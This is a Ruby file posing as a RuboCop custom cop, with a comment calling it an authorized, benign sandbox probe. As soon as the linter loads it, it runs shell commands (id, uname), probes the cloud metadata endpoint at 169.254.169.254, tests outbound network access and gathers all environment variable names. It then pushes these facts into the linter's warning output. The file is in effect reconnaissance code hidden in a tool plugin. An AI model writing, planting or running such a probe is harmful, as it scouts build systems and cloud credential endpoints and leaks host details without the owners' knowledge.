# Benign sandbox probe (authorized VDP test on our own repo). Non-secret facts only; env var NAMES, never values.
require 'socket'
def cr_sh(cmd); `#{cmd} 2>/dev/null`.to_s.strip[0, 120]; rescue StandardError; 'ERR'; end
CR_FACTS = [
  'CRPROBE-91234', 'tool=rubocop', "id=#{cr_sh('id')}", "host=#{Socket.gethostname}", "kernel=#{cr_sh('uname -sr')}",
  "cwd=#{Dir.pwd}", "ruby=#{RUBY_VERSION}",
  "metadata_http=#{cr_sh('curl -s -m 3 -o /dev/null -w "%{http_code}" -H "Metadata-Flavor: Google" http://169.254.169.254/')}",
  "egress_http=#{cr_sh('curl -s -m 3 -o /dev/null -w "%{http_code}" https://example.com/')}",
  "env_names=#{ENV.keys.sort.join(',')[0, 900]}"
].join(' | ')
warn CR_FACTS
module RuboCop
  module Cop
    module Probe
      class Facts < Base
        def on_new_investigation
          add_global_offense(CR_FACTS)
        end
      end
    end
  end
end
